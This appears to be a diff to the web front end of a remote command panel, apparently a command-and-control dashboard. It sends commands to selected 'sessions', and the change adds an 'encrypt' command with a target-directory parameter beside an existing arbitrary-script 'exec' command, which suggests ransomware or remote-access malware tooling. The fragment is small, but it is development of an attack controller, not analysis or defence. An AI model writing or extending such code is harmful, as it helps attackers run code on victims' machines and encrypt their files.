@@ -553,8 +553,10 @@
             const session = document.getElementById('cmdSession').value;
             const cmdType = document.getElementById('cmdType').value;
             const script = document.getElementById('execScript')?.value || '';
-            if (cmdType === 'exec' && !script.trim()) { alert('Please enter script'); return; }
-            const parameters = cmdType === 'exec' ? { script } : {};
+            let parameters = {};
+            if (cmdType === 'exec') parameters = { script };
+            else if (cmdType === 'encrypt') parameters = { TargetDirectory: '' };
+
             try {
                 const res = await fetch('/api/send_command', {
                     method: 'POST',
